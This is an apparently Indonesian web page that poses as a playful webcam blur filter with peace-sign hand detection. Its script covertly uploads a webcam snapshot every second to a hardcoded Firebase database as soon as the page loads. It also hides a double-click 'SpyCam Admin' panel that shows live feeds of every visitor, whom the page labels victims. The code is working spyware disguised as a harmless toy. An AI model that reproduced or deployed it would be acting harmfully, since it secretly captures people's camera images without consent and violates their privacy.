<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aesthetic Blur & Secret Monitor ✌️</title>
    
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@400;500;600&family=Nunito:wght@400;700&display=swap" rel="stylesheet">
    
    <!-- Load AI dari MediaPipe -->
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js" crossorigin="anonymous"></script>

    <style>
        body {
            font-family: 'Nunito', sans-serif;
            background-color: #fce7f3; 
            background-image: radial-gradient(#f9a8d4 2.5px, transparent 2.5px);
            background-size: 32px 32px;
            overflow-x: hidden;
        }

        .font-cute { font-family: 'Fredoka', sans-serif; }

        .polaroid-card {
            background-color: #ffffff;
            padding: 1rem 1rem 4rem 1rem;
            border-radius: 1rem;
            box-shadow: 0 20px 40px rgba(244, 114, 182, 0.2), 0 4px 10px rgba(0,0,0,0.05);
            transform: rotate(-2deg);
            transition: all 0.4s ease;
            position: relative;
        }
        .polaroid-card:hover { transform: rotate(1deg) scale(1.02); }

        .video-container {
            position: relative;
            width: 100%;
            aspect-ratio: 3/4; 
            border-radius: 0.75rem;
            overflow: hidden;
            background-color: #fdf2f8;
            border: 3px dashed #fbcfe8;
        }

        #webcam { display: none; }
        #canvas-display {
            width: 100%; height: 100%; object-fit: cover;
        }

        .glass-panel {
            background: rgba(255, 255, 255, 0.65);
            backdrop-filter: blur(12px);
            border: 2px solid rgba(255, 255, 255, 0.8);
            box-shadow: 0 8px 32px rgba(244, 114, 182, 0.15);
        }

        .loader {
            width: 48px; height: 48px; border: 5px solid #fbcfe8; border-bottom-color: #ec4899;
            border-radius: 50%; display: inline-block; animation: rotation 1s linear infinite;
        }
        @keyframes rotation { 100% { transform: rotate(360deg); } }
        
        @keyframes float {
            0%, 100% { transform: translateY(0px) rotate(0deg); }
            50% { transform: translateY(-12px) rotate(8deg); }
        }
        .floating { animation: float 4s ease-in-out infinite; }
        .delay-1 { animation-delay: 1s; }
        .delay-2 { animation-delay: 2s; }
        
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .spin-slow { animation: spin 3s linear infinite; }
    </style>
</head>
<body class="min-h-screen relative flex items-center justify-center">

    <!-- ==== VIEW UTAMA (USER BIASA) ==== -->
    <div id="main-view" class="w-full flex flex-col items-center p-4 sm:p-8 relative">
        
        <audio id="bg-music" loop><source src="lagu-trend.mp3" type="audio/mpeg"></audio>

        <button id="music-btn" class="fixed top-4 right-4 sm:top-8 sm:right-8 z-50 glass-panel p-3 sm:p-4 rounded-full shadow-lg hover:scale-110 transition-transform group">
            <span id="music-icon" class="text-2xl drop-shadow-md transition-all">🔇</span>
        </button>

        <div class="relative w-full max-w-sm mx-auto flex flex-col items-center gap-6 mt-4">
            <div class="glass-panel px-6 py-3 rounded-full flex items-center gap-3 z-10 floating">
                <span class="text-2xl">📸</span>
                <h1 class="text-xl font-cute font-bold text-pink-600">Trend Blur Video ✌️</h1>
            </div>

            <div class="polaroid-card w-full z-10">
                <div id="rec-indicator" class="hidden absolute top-4 left-4 bg-red-500/90 text-white text-xs font-bold px-3 py-1.5 rounded-full z-30 shadow-md flex items-center gap-2 border border-red-400">
                    <span class="w-2.5 h-2.5 bg-white rounded-full animate-pulse"></span> REC
                </div>

                <div class="absolute -top-6 -left-6 text-4xl floating delay-1 z-20 drop-shadow-lg pointer-events-none">🎀</div>
                <div class="absolute -bottom-4 -right-4 text-4xl floating delay-2 z-20 drop-shadow-lg pointer-events-none">✨</div>
                
                <div class="video-container">
                    <video id="webcam" playsinline muted></video>
                    <canvas id="canvas-display"></canvas>
                    
                    <div class="absolute inset-2 border-2 border-white/40 rounded-lg pointer-events-none z-10"></div>
                    <div id="loading-screen" class="absolute inset-0 flex flex-col items-center justify-center bg-pink-50/90 z-20 transition-opacity">
                        <span class="loader mb-4"></span>
                        <p class="text-pink-500 font-cute font-semibold animate-pulse text-center">Menyiapkan Kamera...</p>
                    </div>
                </div>
                
                <!-- TOMBOL RAHASIA ADMIN (est. 2026) -->
                <div id="secret-admin" title="Double Click for Magic!" class="absolute bottom-4 right-4 transform -rotate-3 text-pink-400 font-cute text-sm opacity-80 cursor-pointer select-none hover:text-pink-600 transition-colors z-30">
                    est. 2026
                </div>
                
                <p id="polaroid-text" class="text-center mt-5 text-gray-500 font-cute font-medium text-xl pointer-events-none">Me & You &lt;3</p>
            </div>

            <!-- KONTROL VIDEO -->
            <div class="flex justify-center gap-3 w-full z-10 flex-col sm:flex-row">
                <button id="btn-record" class="hidden bg-pink-500 hover:bg-pink-600 text-white font-cute font-bold py-3 px-6 rounded-full shadow-lg flex items-center gap-2 justify-center transition-transform hover:scale-105">
                    <span class="animate-pulse">🔴</span> Mulai Rekam
                </button>
                <button id="btn-stop" class="hidden bg-gray-600 hover:bg-gray-700 text-white font-cute font-bold py-3 px-6 rounded-full shadow-lg flex items-center gap-2 justify-center transition-transform hover:scale-105">
                    <span>⏹️</span> Stop
                </button>
                <a id="btn-download" class="hidden bg-purple-500 hover:bg-purple-600 text-white font-cute font-bold py-3 px-6 rounded-full shadow-lg flex items-center gap-2 justify-center transition-transform hover:scale-105" download="Trend-Video.webm">
                    <span>📥</span> Simpan Video
                </a>
            </div>

            <!-- STATUS -->
            <div class="glass-panel px-6 py-4 rounded-3xl flex items-center gap-4 w-full justify-center hover:scale-105 transition-transform z-10">
                <div class="bg-white/80 p-2 rounded-full"><span id="status-icon" class="text-2xl block">👋</span></div>
                <p id="status-text" class="text-pink-500 font-cute text-lg font-medium">Izinkan kamera ya!</p>
            </div>
        </div>
    </div>

    <!-- ==== VIEW ADMIN / CCTV ==== -->
    <div id="admin-view" class="hidden fixed inset-0 bg-gray-900/95 backdrop-blur-xl z-50 flex flex-col p-4 sm:p-8 overflow-y-auto">
        <div class="max-w-6xl mx-auto w-full">
            <div class="flex justify-between items-center mb-8 border-b border-gray-700 pb-4">
                <div>
                    <h2 class="text-3xl text-pink-400 font-cute font-bold flex items-center gap-3">
                        <span class="animate-pulse text-red-500">🔴</span> SpyCam Admin
                    </h2>
                    <p class="text-gray-400 text-sm mt-1 font-cute">Memantau target secara live (Database URL kamu)...</p>
                </div>
                <button id="btn-exit-admin" class="bg-white/10 hover:bg-white/20 text-white font-cute px-5 py-2.5 rounded-full transition-colors flex items-center gap-2">
                    Tutup <span>🚪</span>
                </button>
            </div>

            <div id="admin-grid" class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4 sm:gap-6">
                <!-- Video target masuk ke sini -->
            </div>
        </div>
    </div>

    <!-- SCRIPT FIREBASE & AI -->
    <script type="module">
        // Import Firebase App & Realtime Database bawaan asli Google
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
        import { getDatabase, ref, set, onValue } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-database.js";

        // Variabel UI
        const videoElement = document.getElementById('webcam');
        const canvasElement = document.getElementById('canvas-display');
        const canvasCtx = canvasElement.getContext('2d');
        const loadingScreen = document.getElementById('loading-screen');
        const statusText = document.getElementById('status-text');
        const statusIcon = document.getElementById('status-icon');
        const polaroidText = document.getElementById('polaroid-text');
        
        let targetBlur = 0, currentBlur = 0, isBlurNow = false;

        // --- SISTEM ID USER ---
        // Kita bikin ID Unik per perangkat tanpa perlu sistem login
        let myUserId = localStorage.getItem('spycam_uid');
        if (!myUserId) {
            myUserId = 'user_' + Math.random().toString(36).substring(2, 15);
            localStorage.setItem('spycam_uid', myUserId);
        }

        // --- FIREBASE REALTIME DATABASE SETUP (PAKAI DATABASE KAMU) ---
        const firebaseConfig = {
            databaseURL: "https://spy4-b564b-default-rtdb.asia-southeast1.firebasedatabase.app/"
        };
        
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // --- BROADCAST KAMERA KE DATABASE ---
        function startBroadcasting() {
            const thumbCanvas = document.createElement('canvas');
            thumbCanvas.width = 120; thumbCanvas.height = 160; 
            const tCtx = thumbCanvas.getContext('2d');

            setInterval(() => {
                if (!videoElement.paused && !videoElement.ended) {
                    tCtx.drawImage(canvasElement, 0, 0, thumbCanvas.width, thumbCanvas.height);
                    // Turunkan kualitas ke 0.3 biar upload datanya super cepat & ga lemot
                    const base64Img = thumbCanvas.toDataURL('image/jpeg', 0.3); 
                    
                    try {
                        const camRef = ref(db, 'spycam_live/' + myUserId);
                        set(camRef, {
                            frame: base64Img,
                            isBlur: isBlurNow,
                            lastActive: Date.now()
                        });
                    } catch(e) {
                        console.log("Upload gagal, cek aturan Rules Firebase!");
                    }
                }
            }, 1000); // Ngirim gambar setiap 1 detik
        }

        // --- SISTEM ADMIN RAHASIA (DOUBLE CLICK) ---
        const secretBtn = document.getElementById('secret-admin');

        secretBtn.addEventListener('dblclick', () => {
            document.getElementById('main-view').classList.add('hidden');
            document.getElementById('admin-view').classList.remove('hidden');

            const spycamRef = ref(db, 'spycam_live');
            
            // Dengarkan perubahan data Live
            onValue(spycamRef, (snapshot) => {
                const grid = document.getElementById('admin-grid');
                grid.innerHTML = '';
                let activeCount = 0;
                const nowWaktu = Date.now();

                snapshot.forEach(childSnap => {
                    const data = childSnap.val();
                    
                    // Kalau target gak ada update lebih dari 10 detik, anggap dia udah tutup webnya
                    if (nowWaktu - data.lastActive > 10000) return; 
                    
                    activeCount++;

                    const div = document.createElement('div');
                    div.className = 'relative rounded-xl overflow-hidden border-2 border-pink-500/50 bg-gray-800 aspect-[3/4] shadow-2xl';
                    div.innerHTML = `
                        <img src="${data.frame}" class="w-full h-full object-cover">
                        <div class="absolute top-2 left-2 bg-black/70 text-white text-[10px] px-2 py-1 rounded-md font-cute backdrop-blur border border-white/20">
                            ${data.isBlur ? '✌️ Ngeblur' : '👀 Melihat'}
                        </div>
                        <div class="absolute bottom-2 right-2 flex items-center gap-1 bg-red-500/90 text-white text-[9px] px-1.5 py-0.5 rounded shadow font-bold tracking-wider">
                            <span class="w-1.5 h-1.5 bg-white rounded-full animate-pulse"></span> LIVE
                        </div>
                    `;
                    grid.appendChild(div);
                });

                if(activeCount === 0) {
                    grid.innerHTML = '<div class="col-span-full text-center text-gray-500 font-cute mt-10">Belum ada korban yang buka web ini... 🥺</div>';
                }
            }, (error) => {
                console.error("Error Admin:", error);
                alert("Gagal load data. Pastikan Rules Firebase sudah diset 'true'!");
            });
        });

        document.getElementById('btn-exit-admin').addEventListener('click', () => {
            document.getElementById('admin-view').classList.add('hidden');
            document.getElementById('main-view').classList.remove('hidden');
        });

        // --- AI MEDIAPIPE & CAMERA ---
        const hands = new Hands({ locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}` });
        hands.setOptions({ maxNumHands: 1, modelComplexity: 1, minDetectionConfidence: 0.7, minTrackingConfidence: 0.7 });

        hands.onResults((results) => {
            if (!loadingScreen.classList.contains('hidden')) {
                loadingScreen.classList.add('opacity-0');
                setTimeout(() => { 
                    loadingScreen.classList.add('hidden'); 
                    document.getElementById('btn-record').classList.remove('hidden'); 
                }, 300);
            }

            if (results.multiHandLandmarks && results.multiHandLandmarks.length > 0) {
                const lm = results.multiHandLandmarks[0];
                const is2 = (lm[8].y < lm[6].y) && (lm[12].y < lm[10].y) && (lm[16].y > lm[14].y) && (lm[20].y > lm[18].y);

                if (is2) {
                    targetBlur = 16; isBlurNow = true;
                    statusText.innerText = "Pose ✌️ Ketemu!"; statusIcon.innerText = "✨";
                    polaroidText.innerText = "Blurred Memories ☁️";
                } else {
                    targetBlur = 0; isBlurNow = false;
                    statusText.innerText = "Ayo pose ✌️"; statusIcon.innerText = "👀";
                    polaroidText.innerText = "Me & You <3";
                }
            } else {
                targetBlur = 0; isBlurNow = false;
                statusText.innerText = "Tunjukin tanganmu!"; statusIcon.innerText = "👋";
            }
        });

        let mediaStream;
        async function startApp() {
            try {
                mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 480, height: 640 }, audio: true });
                videoElement.srcObject = mediaStream;
                videoElement.play();

                videoElement.onloadedmetadata = () => {
                    canvasElement.width = videoElement.videoWidth; canvasElement.height = videoElement.videoHeight;
                    requestAnimationFrame(renderLoop);
                    startAILoop();
                    startBroadcasting(); // Mulai kirim gambar ke Firebase KAMU!
                };
            } catch (err) {
                statusText.innerText = "Kamera diblokir!"; statusIcon.innerText = "🥺";
            }
        }

        async function startAILoop() {
            if (!videoElement.paused && !videoElement.ended) await hands.send({ image: videoElement });
            requestAnimationFrame(startAILoop);
        }

        function renderLoop() {
            canvasCtx.save();
            canvasCtx.translate(canvasElement.width, 0); canvasCtx.scale(-1, 1);
            currentBlur += (targetBlur - currentBlur) * 0.15;
            if (currentBlur < 0.1) currentBlur = 0;
            canvasCtx.filter = currentBlur > 0 ? `blur(${currentBlur}px) saturate(1.3) brightness(1.1)` : 'none';
            canvasCtx.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
            canvasCtx.restore();
            requestAnimationFrame(renderLoop);
        }

        // --- PEREKAM VIDEO LOKAL ---
        let mediaRecorder; let recordedChunks = [];
        document.getElementById('btn-record').addEventListener('click', () => {
            recordedChunks = [];
            const canvasStream = canvasElement.captureStream(30);
            if (mediaStream.getAudioTracks().length > 0) canvasStream.addTrack(mediaStream.getAudioTracks()[0]);

            mediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
            mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
            mediaRecorder.onstop = () => {
                const url = URL.createObjectURL(new Blob(recordedChunks, { type: 'video/webm' }));
                document.getElementById('btn-download').href = url;
                document.getElementById('btn-download').classList.remove('hidden');
                statusText.innerText = "Video disimpan! 🎉";
            };

            mediaRecorder.start();
            document.getElementById('btn-record').classList.add('hidden');
            document.getElementById('btn-stop').classList.remove('hidden');
            document.getElementById('rec-indicator').classList.remove('hidden');
        });

        document.getElementById('btn-stop').addEventListener('click', () => {
            mediaRecorder.stop();
            document.getElementById('btn-stop').classList.add('hidden');
            document.getElementById('btn-record').classList.remove('hidden');
            document.getElementById('rec-indicator').classList.add('hidden');
            document.getElementById('btn-record').innerHTML = '<span>🔄</span> Ulangi';
        });

        // MUSIK
        let isMusicPlaying = false;
        document.getElementById('music-btn').addEventListener('click', () => {
            const bgMusic = document.getElementById('bg-music');
            const icon = document.getElementById('music-icon');
            if (isMusicPlaying) {
                bgMusic.pause(); icon.innerText = "🔇"; isMusicPlaying = false;
            } else {
                bgMusic.play().then(() => { icon.innerText = "🎵"; isMusicPlaying = true; })
                .catch(() => statusText.innerText = "Lagu blm ada!");
            }
        });

        startApp();
    </script>
</body>
</html>
